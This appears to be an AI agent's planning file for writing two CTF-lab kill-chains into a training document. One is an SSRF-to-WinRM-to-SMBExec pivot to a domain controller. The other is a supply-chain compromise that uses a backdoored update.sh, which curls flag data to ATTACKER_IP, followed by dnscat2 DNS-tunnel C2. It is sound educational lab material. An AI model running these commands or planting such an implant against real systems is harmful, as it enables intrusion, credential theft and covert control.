---
phase: 04-llm-atp-chain-kill-chains-final-review
plan: 03
type: execute
wave: 3
depends_on:
  - 04-02
files_modified:
  - docs/KILL-CHAINS.md
autonomous: true
requirements:
  - ATP-01
  - ATP-02

must_haves:
  truths:
    - "docs/KILL-CHAINS.md contains a ## Multi-Step ATP Chain Kill-Chains section header"
    - "ATP-01 kill-chain has exactly 2 flag stages: [FLAG 1] at WinRM pivot host, [FLAG 2] at DC via SMBExec"
    - "ATP-01 Stage names identify the two distinct lateral movement protocols: WinRM (first hop) and SMB/SMBExec (second hop)"
    - "ATP-01 uses Flask /fetch?url= SSRF to steal internal credentials (per D-09)"
    - "ATP-02 kill-chain has exactly 2 flag stages: [FLAG 1] when cron executes backdoored update, [FLAG 2] via dnscat2 shell"
    - "ATP-02 shows the exact nginx update server + cron curl|bash pattern (per D-12)"
    - "ATP-02 shows dnscat2 Ruby server startup and client execution (per D-13)"
    - "All stages in both kill-chains have all four fields: Action, Command, Expected Output, TTP"
  artifacts:
    - path: "docs/KILL-CHAINS.md"
      provides: "ATP section header + ATP-01 + ATP-02 kill-chains appended after LLM-03"
      contains: "## Multi-Step ATP Chain Kill-Chains"
  key_links:
    - from: "docs/KILL-CHAINS.md §ATP-01"
      to: "evil-winrm (first hop) and smbexec.py (second hop)"
      via: "Stage headings naming the lateral movement protocol"
      pattern: "smbexec"
    - from: "docs/KILL-CHAINS.md §ATP-02"
      to: "dnscat2 Ruby server"
      via: "Command block in DNS tunnel stage"
      pattern: "dnscat2"
---

<objective>
Append the ATP (Multi-Step APT Chain) section header and the first two ATP kill-chains
(ATP-01 HAFNIUM-style and ATP-02 SolarWinds-style) to docs/KILL-CHAINS.md.

Purpose: ATP-01 and ATP-02 are the two simpler ATP scenarios (SSRF-to-WinRM chain
and supply-chain compromise respectively). Authoring them together establishes the
ATP two-flag pattern before the more complex cloud-identity (ATP-03) and AD-relay
(ATP-04) scenarios.

Output: docs/KILL-CHAINS.md extended with `## Multi-Step ATP Chain Kill-Chains`
header, ATP-01 (~7 stages + [FLAG 1] + [FLAG 2]), and ATP-02 (~7 stages + [FLAG 1] +
[FLAG 2]).
</objective>

<execution_context>
@/home/researcher/Research/cont_adic/.planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md
</execution_context>

<context>
@/home/researcher/Research/cont_adic/.planning/ROADMAP.md
@/home/researcher/Research/cont_adic/.planning/REQUIREMENTS.md
@/home/researcher/Research/cont_adic/docs/KILL-CHAINS.md
@/home/researcher/Research/cont_adic/docs/SCENARIOS.md
</context>

<tasks>

<task type="auto">
  <name>Task 1: Append ATP section header and ATP-01 kill-chain (HAFNIUM-style)</name>

  <read_first>
    - docs/KILL-CHAINS.md — Read the tail (after LLM-03 from Plan 02) to confirm exact
      append point. Also read AD-05 kill-chain (dual-flag ATP pattern exemplar — search
      for "### AD-05:" to find its section) to confirm two-flag heading format.
    - .planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md — Read
      D-09 (Flask /fetch?url= SSRF, internal credential store endpoint),
      D-10 (WinRM with evil-winrm, Flag 1 on pivot host),
      D-11 (SMBExec via smbexec.py to DC, Flag 2 on DC).
    - .planning/REQUIREMENTS.md — ATP-01 entry (Hard, 3 VMs, HAFNIUM-style, SSRF →
      webshell → WinRM [Flag 1] → enumerate → DC [Flag 2], two distinct protocols).
    - docs/SCENARIOS.md — ATP-01 student-facing description.
    - CLAUDE.md §Mini-APT Lateral Movement Chains — lateral movement tool table.
      §VM Profiles — Profile 3 (Ubuntu pivot) and Profile 1 (Windows DC).
  </read_first>

  <action>
  Append to docs/KILL-CHAINS.md after LLM-03's flag stage separator line.

  STEP A — ATP section header:
  ```
  ---

  ## Multi-Step ATP Chain Kill-Chains

  Multi-step ATP scenarios simulate real-world APT (Advanced Persistent Threat) campaigns.
  Each scenario has exactly two flags placed at lateral movement boundaries. The first flag
  is captured after the initial foothold and first lateral movement hop; the second flag
  is captured after the second lateral movement hop using a distinct protocol. All ATP
  kill-chains use VM role labels per §1.3 ([PivotHost], [DC], [AttackerVM]).
  ```

  STEP B — ATP-01 scenario header block:
  ```
  ---

  ### ATP-01: HAFNIUM-Style SSRF Pivot to Domain Controller

  **VMs:** Attacker (Kali), Pivot Server (Ubuntu 22.04, Flask app + internal credential endpoint), DC (Windows Server 2019, corp.local)
  **Difficulty:** Hard
  **Flags:** 2
  ```
  Narrative (two sentences): This scenario simulates the HAFNIUM campaign pattern —
  exploiting a web application SSRF vulnerability to steal internal credentials, then
  using those credentials to pivot laterally across two hosts via distinct protocols.
  The student chains SSRF-to-credential-theft (HTTP), WinRM lateral movement to the
  pivot host, and SMB-based lateral movement to the Domain Controller.

  STAGES — 7 stages: 5 attack stages, [FLAG 1] at Stage 5, then 1 more attack stage,
  [FLAG 2] at Stage 7.

  STAGE 1: "Web Application Reconnaissance [PivotHost]"
  - Action: You enumerate the Flask web application on the pivot server to identify
    the SSRF-vulnerable endpoint and map internal services reachable from the server.
  - Command:
    `nmap -sV -p 80,8080,5000,443 PIVOT_HOST_IP`
    `curl -s http://PIVOT_HOST_IP:5000/`
    `# Discover the vulnerable endpoint:`
    `curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:5000/"` 
  - Expected Output: Flask app responding on port 5000. The `/fetch?url=` endpoint
    returns content from the URL parameter without validation, confirming SSRF.
  - TTP: `[T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access`

  STAGE 2: "SSRF Exploitation — Internal Credential Store Enumeration [PivotHost]"
  - Action: You exploit the SSRF endpoint to reach the internal credential store
    endpoint (not directly accessible from the internet) and steal the Windows
    pivot host credentials.
  - Command:
    `# Probe internal services via SSRF:`
    `curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:8000/"`
    `# Access the internal credential endpoint:`
    `curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:8000/config/credentials"`
    `# Alternative — enumerate common internal ports:`
    `for port in 8000 8080 8888 9000 3000; do`
    `  echo -n "port=$port: "; curl -s "http://PIVOT_HOST_IP:5000/fetch?url=http://127.0.0.1:$port/" | head -c 80; echo;`
    `done`
  - Expected Output:
    `{"host": "WINRM_HOST_IP", "username": "svc_deploy", "password": "Winter2024!"}`
    (representative — shows credential JSON returned by the internal config endpoint)
  - TTP: `[T1078.001 — Default Accounts](https://attack.mitre.org/techniques/T1078/001/) · Defense Evasion` · `[T1602 — Data from Configuration Repository](https://attack.mitre.org/techniques/T1602/) · Collection`

  STAGE 3: "First Lateral Movement — WinRM to Pivot Windows Host [PivotHost]" (per D-10)
  - Action: You use the harvested credentials to authenticate to the Windows pivot host
    via WinRM, establishing an interactive PowerShell session as the service account.
  - Command:
    `evil-winrm -i WINRM_HOST_IP -u svc_deploy -p 'HARVESTED_PASSWORD'`
    `# Alternative — verify WinRM access before shell:`
    `nxc winrm WINRM_HOST_IP -u svc_deploy -p 'HARVESTED_PASSWORD'`
  - Expected Output:
    `Evil-WinRM shell v3.x`
    `Info: Establishing connection to remote endpoint`
    `*Evil-WinRM* PS C:\Users\svc_deploy\Documents>`
  - TTP: `[T1021.006 — Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) · Lateral Movement`

  STAGE 4: "Pivot Host Enumeration — Domain Credential Discovery [PivotHost]"
  - Action: You enumerate the Windows pivot host filesystem and registry for stored
    domain credentials and configuration files that can be leveraged for the second
    lateral movement hop.
  - Command (runs in evil-winrm shell):
    `# Search for credential files`
    `dir C:\inetpub\ /s /b | findstr /i "web.config password.txt creds"`
    `# Read the web application config for DB/domain credentials`
    `type C:\inetpub\wwwroot\web.config`
    `# Check for scheduled tasks with stored credentials`
    `schtasks /query /fo LIST /v | findstr /i "run as\|password"`
  - Expected Output: A `web.config` or credential file exposing a domain account
    password usable for SMB access to the DC (e.g., `<add key="DomainPass" value="Adm1n@corp"/>`).
  - TTP: `[T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) · Credential Access`

  [FLAG 1] STAGE 5: "Flag Capture — Pivot Host Filesystem [PivotHost]" (per D-10)
  - Use §1.2 format: `### [FLAG 1] Stage 5: Flag Capture — Pivot Host Filesystem [PivotHost]`
  - Action: You retrieve Flag 1 from the Windows pivot host filesystem, confirming
    successful first-hop lateral movement via WinRM using SSRF-stolen credentials.
  - Command (in evil-winrm shell):
    `type C:\Users\svc_deploy\Desktop\flag1.txt`
    `# Alternative if flag is in a different location:`
    `dir C:\ /s /b | findstr "flag1.txt"`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)

  STAGE 6: "Second Lateral Movement — SMBExec to Domain Controller [DC]" (per D-11)
  - Action: You use the domain credentials discovered on the pivot host to execute
    commands on the Domain Controller via SMBExec, completing the HAFNIUM-style
    two-hop lateral movement chain with a distinct protocol from the first hop.
  - Command:
    `# From attacker VM — run smbexec.py (Impacket) against the DC:`
    `smbexec.py CORP.LOCAL/DOMAIN_ADMIN:DOMAIN_PASSWORD@DC_IP`
    `# Alternative — verify SMB access first:`
    `nxc smb DC_IP -u DOMAIN_ADMIN -p DOMAIN_PASSWORD`
    `# Then exec:`
    `smbexec.py CORP.LOCAL/DOMAIN_ADMIN:DOMAIN_PASSWORD@DC_IP`
  - Expected Output:
    `Impacket v0.x - Copyright ...`
    `[!] Launching semi-interactive shell - Careful what you execute`
    `C:\Windows\system32>`
  - TTP: `[T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement`

  [FLAG 2] STAGE 7: "Flag Capture — Domain Controller Filesystem [DC]" (per D-11)
  - Use §1.2 format: `### [FLAG 2] Stage 7: Flag Capture — Domain Controller Filesystem [DC]`
  - Action: You retrieve Flag 2 from the Domain Controller filesystem via the SMBExec
    shell, completing the HAFNIUM-style ATP chain.
  - Command (in smbexec.py shell):
    `type C:\Users\Administrator\Desktop\flag2.txt`
    `# Alternative if flag is elsewhere:`
    `dir C:\ /s /b | findstr "flag2.txt"`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)
  </action>

  <verify>
    <automated>grep -n "^### ATP-01:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md && grep "smbexec.py" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md && grep "evil-winrm" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | grep -v "^#" | head -5</automated>
  </verify>

  <acceptance_criteria>
  - `grep "## Multi-Step ATP Chain Kill-Chains" docs/KILL-CHAINS.md` returns exactly 1 match
  - `grep "### ATP-01:" docs/KILL-CHAINS.md` returns exactly 1 match
  - ATP-01 section contains `[FLAG 1]` at Stage 5 (WinRM pivot, per D-10) and
    `[FLAG 2]` at Stage 7 (DC via SMBExec, per D-11) — exactly 2 flag stages
  - Stage 3 heading names "WinRM" (first protocol, per D-10)
  - Stage 6 heading names "SMBExec" (second protocol, per D-11 — distinct from WinRM)
  - Stage 2 Command block contains `/fetch?url=` SSRF pattern (per D-09)
  - Stage 2 Command block shows internal credential endpoint access (per D-09)
  - `**Difficulty:** Hard` and `**Flags:** 2` in ATP-01 header
  - All 7 stages have Action, Command, Expected Output, TTP — no field omitted
  - No Metasploit references in appended content
  </acceptance_criteria>
</task>

<task type="auto">
  <name>Task 2: Append ATP-02 kill-chain (SolarWinds-style supply chain)</name>

  <read_first>
    - docs/KILL-CHAINS.md — Read the tail to confirm ATP-01 [FLAG 2] Stage 7 is properly
      closed with a `---` separator before appending ATP-02.
    - .planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md — Read
      D-12 (nginx update server + cron curl|bash pattern on VM2, backdoored update.sh
      replaces legitimate tarball, Flag 1 fires when cron executes it),
      D-13 (dnscat2: Ruby server on attacker VM, client on compromised VM2, DNS shell,
      no root required, fake authoritative DNS in lab, Flag 2 via dnscat2 shell).
      Also read the Specific Ideas block for ATP-02 (curl|bash cron example,
      teaching moment about update pipeline integrity).
    - .planning/REQUIREMENTS.md — ATP-02 entry (Hard, 3 VMs, SolarWinds-style, update
      server compromise → backdoored update executes on downstream target [Flag 1] →
      DNS tunnel C2 to isolated final target [Flag 2]).
    - docs/SCENARIOS.md — ATP-02 student-facing description.
    - CLAUDE.md §Mini-APT Lateral Movement Chains — relevant C2 and pivot tools.
  </read_first>

  <action>
  Append ATP-02 immediately after the ATP-01 kill-chain (after the ATP-01 [FLAG 2]
  separator line).

  ATP-02 scenario header block:
  ```
  ### ATP-02: SolarWinds-Style Supply Chain Compromise + DNS C2

  **VMs:** Attacker (Kali), Update Server (Ubuntu 22.04, nginx serving update packages), Target (Ubuntu 22.04, cron job polling update server)
  **Difficulty:** Hard
  **Flags:** 2
  ```
  Narrative (two sentences): This scenario simulates the SolarWinds supply chain attack
  pattern — the student compromises the software update distribution server and replaces
  the legitimate update package with a backdoored one, which executes automatically on
  the downstream target when its scheduled update poll fires. After establishing a foothold
  via the backdoored update, the student sets up a covert command-and-control channel
  using DNS tunneling (dnscat2) to reach an isolated final target and retrieve the second flag.

  STAGES — 7 stages: 4 attack stages, [FLAG 1] at Stage 4, then 2 more stages, [FLAG 2] at Stage 7.

  STAGE 1: "Update Server Reconnaissance and Tarball Discovery [UpdateSrv]"
  - Action: You enumerate the nginx update server to identify the directory structure,
    locate the legitimate update package, and understand the update delivery mechanism.
  - Command:
    `nmap -sV -p 80,443,8080 UPDATE_SERVER_IP`
    `curl -s http://UPDATE_SERVER_IP/`
    `# List available update packages:`
    `curl -s http://UPDATE_SERVER_IP/updates/`
    `# Download the legitimate update script to inspect its structure:`
    `curl -O http://UPDATE_SERVER_IP/updates/update.sh`
    `cat update.sh`
  - Expected Output: nginx directory listing showing `update.sh` (the update script
    polled by VM2). Contents of `update.sh` show it runs system configuration steps
    and optionally installs packages — confirming a shell script update mechanism.
  - TTP: `[T1592 — Gather Victim Host Information](https://attack.mitre.org/techniques/T1592/) · Reconnaissance`

  STAGE 2: "Backdoored Update Crafting — Supply Chain Implant"
  - Action: You craft a backdoored replacement for the legitimate update script that
    executes a flag-reading callback while appearing to perform legitimate update operations.
  - Command — show the backdoored update.sh creation (per D-12 / Claude's discretion):
    `cat > backdoor_update.sh << 'EOF'`
    `#!/bin/bash`
    `# Legitimate-looking update steps (cover for the implant)`
    `apt-get update -qq 2>/dev/null`
    `# Implant: read flag and send to attacker callback`
    `FLAG=$(cat /root/flag1.txt 2>/dev/null || cat /home/ubuntu/flag1.txt 2>/dev/null)`
    `curl -s "http://ATTACKER_IP:CALLBACK_PORT/flag?data=$FLAG" &`
    `# Continue legitimate update (avoid detection)`
    `exit 0`
    `EOF`
    `chmod +x backdoor_update.sh`
    Note: "The backdoored script is designed to blend in with legitimate update activity.
    The flag-read callback fires in the background — the cron job completes normally,
    masking the compromise (per D-12 supply chain teaching objective)."
  - Expected Output: `backdoor_update.sh` created and executable.
  - TTP: `[T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/) · Initial Access`

  STAGE 3: "Update Server File Replacement — Plant the Implant [UpdateSrv]"
  - Action: You replace the legitimate update script on the nginx update server with
    the backdoored version, completing the supply chain implant.
  - Command:
    `# Attacker must have write access to the update server (pre-condition: SSH access`
    `# is granted as the update server admin — this is the scenario starting credential):`
    `scp backdoor_update.sh UPDATE_SERVER_ADMIN@UPDATE_SERVER_IP:/var/www/html/updates/update.sh`
    `# Verify replacement:`
    `curl -s http://UPDATE_SERVER_IP/updates/update.sh | head -5`
    `# Start a listener for the flag callback:`
    `nc -lvnp CALLBACK_PORT`
  - Expected Output: SCP succeeds. Curl confirms the backdoored script is now served
    by nginx. Netcat listener is waiting.
  - TTP: `[T1505 — Server Software Component](https://attack.mitre.org/techniques/T1505/) · Persistence`

  [FLAG 1] STAGE 4: "Flag Capture — Backdoored Update Execution on Target [Target]" (per D-12)
  - Use §1.2 format: `### [FLAG 1] Stage 4: Flag Capture — Backdoored Update Execution [Target]`
  - Action: You wait for the target's cron job to poll the update server and execute the
    backdoored script, receiving Flag 1 via the callback channel on your netcat listener.
  - Command:
    `# Listener already running from Stage 3. Wait for the cron job (fires every 60 seconds):`
    `# Observed on attacker nc listener:`
    `nc -lvnp CALLBACK_PORT`
    `# The cron job on the target runs:`
    `# curl http://UPDATE_SERVER_IP/updates/update.sh | bash`
    `# which executes the backdoored update.sh and hits the callback.`
  - Expected Output:
    ```
    Connection received on TARGET_IP PORT
    GET /flag?data=CTF{...flag_value_placeholder...} HTTP/1.1
    ```
  - TTP: `—` (flag capture, not an adversarial technique)

  STAGE 5: "DNS Tunnel Establishment — dnscat2 C2 Channel [Target]" (per D-13)
  - Action: You establish a covert command-and-control channel to the isolated final
    target using dnscat2, which encapsulates shell commands inside DNS queries —
    bypassing network controls that block direct TCP connections.
  - Command:
    `# On attacker VM — start the dnscat2 Ruby server:`
    `# (Pre-req: Ruby installed; dnscat2 server cloned from https://github.com/iagox86/dnscat2)`
    `cd dnscat2/server && ruby dnscat2.rb --dns "host=ATTACKER_IP,port=53,domain=TUNNEL_DOMAIN" --no-cache`
    `# On the compromised target VM (executed via the netcat shell from Stage 4):`
    `./dnscat2-client TUNNEL_DOMAIN`
    `# Alternative — run the compiled Linux client:`
    `# Pre-staged binary: /tmp/dnscat2`
    `/tmp/dnscat2 ATTACKER_IP`
  - Expected Output:
    `dnscat2> New session established: 1`
    `Session 1 Security: ENCRYPTED`
    `dnscat2>`
  - TTP: `[T1071.004 — Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/) · Command and Control`

  STAGE 6: "Covert Lateral Movement — dnscat2 Shell to Isolated Target [Target]"
  - Action: You use the dnscat2 encrypted DNS shell on the compromised target to
    enumerate and reach the isolated final target on the internal network segment,
    which is not directly reachable from the attacker VM.
  - Command (in dnscat2 server console):
    `dnscat2> session -i 1`
    `command (1)> shell`
    `# In the shell session — enumerate the internal network:`
    `ip route`
    `ip addr`
    `# Scan the isolated segment for the final target:`
    `for ip in $(seq 1 254); do`
    `  ping -c1 -W1 INTERNAL_SUBNET.$ip &>/dev/null && echo "$ip up";`
    `done`
  - Expected Output:
    `command (1)> shell`
    `New window created: 2`
    `# Shell session output:`
    `INTERNAL_SUBNET.1 up`
    `INTERNAL_SUBNET.42 up`
  - TTP: `[T1090 — Proxy](https://attack.mitre.org/techniques/T1090/) · Command and Control`

  [FLAG 2] STAGE 7: "Flag Capture — Isolated Final Target via dnscat2 [Target]" (per D-13)
  - Use §1.2 format: `### [FLAG 2] Stage 7: Flag Capture — Isolated Final Target via dnscat2 [Target]`
  - Action: You retrieve Flag 2 from the isolated final target through the dnscat2
    DNS tunnel, completing the SolarWinds-style ATP chain with a covert C2 channel
    that bypasses direct network controls.
  - Command (in dnscat2 shell session):
    `cat /root/flag2.txt`
    `# Alternative if flag location varies:`
    `find / -name "flag2.txt" 2>/dev/null`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)
  </action>

  <verify>
    <automated>grep -n "^### ATP-02:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md && grep "dnscat2" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | head -5 && grep -c "^### \[FLAG [12]\]" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md</automated>
  </verify>

  <acceptance_criteria>
  - `grep "### ATP-02:" docs/KILL-CHAINS.md` returns exactly 1 match
  - ATP-02 section contains `[FLAG 1]` at Stage 4 (cron executes backdoored update, per D-12)
    and `[FLAG 2]` at Stage 7 (dnscat2 shell, per D-13) — exactly 2 flag stages
  - Stage 3 shows the nginx file replacement pattern (update.sh replaced per D-12)
  - Stage 5 Command block contains `ruby dnscat2.rb` (Ruby server startup, per D-13)
  - Stage 5 shows dnscat2 client execution on the target (per D-13)
  - Stage 2 Command block contains `curl | bash` equivalent in cron job note (per D-12 teaching objective)
  - `**Difficulty:** Hard` and `**Flags:** 2` in ATP-02 header
  - All 7 stages have Action, Command, Expected Output, TTP — no field omitted
  - `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 24
    (17 Phase 2-3 + 2 LLM-01 + 1 LLM-02 + 1 LLM-03 ... wait: 17+2+1 = 20 from Plans 01-02,
    +2 ATP-01 from Task 1 = 22, +2 ATP-02 from this task = 24)
  - No Metasploit references in appended content
  - Stage 5 TTP references T1071.004 (DNS C2 — Application Layer Protocol: DNS)
  </acceptance_criteria>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Author → docs/KILL-CHAINS.md | Documentation prose append — no code execution boundary |
| dnscat2 command examples | Legitimate CTF tooling; commands are instructional prose, not executed by the planner |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-04-05 | Tampering | KILL-CHAINS.md ATP section position | mitigate | Read tail of document before appending to confirm ATP section follows LLM-03, not inserted elsewhere |
| T-04-06 | Repudiation | Two-flag placement correctness | mitigate | acceptance_criteria assert exact [FLAG 1] and [FLAG 2] stage numbers and locations (pivot vs DC, cron vs dnscat2) |
| T-04-SC | Tampering | npm/pip/cargo installs | accept | No package installs — documentation authoring only |
</threat_model>

<verification>
After both tasks complete:

```bash
# Confirm ATP section header
grep -n "## Multi-Step ATP Chain Kill-Chains" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm both scenario headers
grep -n "^### ATP-0[12]:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm ATP-01 uses two distinct lateral movement protocols
grep -A2 "SMBExec" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | head -10

# Confirm ATP-02 dnscat2 is present
grep "dnscat2" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | head -5

# Confirm total flag stages (should be 24)
grep -c "^### \[FLAG [12]\]" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm SSRF /fetch?url= pattern in ATP-01
grep "fetch?url=" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md
```
</verification>

<success_criteria>
- `## Multi-Step ATP Chain Kill-Chains` section header present after LLM-03
- ATP-01 has 7 stages (5 attack + [FLAG 1] + [FLAG 2]) with WinRM as first protocol and SMBExec as second (per D-09..D-11)
- ATP-02 has 7 stages (4 attack + [FLAG 1] + 2 attack + [FLAG 2]) with nginx supply chain and dnscat2 DNS C2 (per D-12..D-13)
- Total flag stages in document: 24
- All stages in both kill-chains have four-field format: Action, Command, Expected Output, TTP
</success_criteria>

<output>
Create `.planning/phases/04-llm-atp-chain-kill-chains-final-review/04-03-SUMMARY.md` when done.
</output>
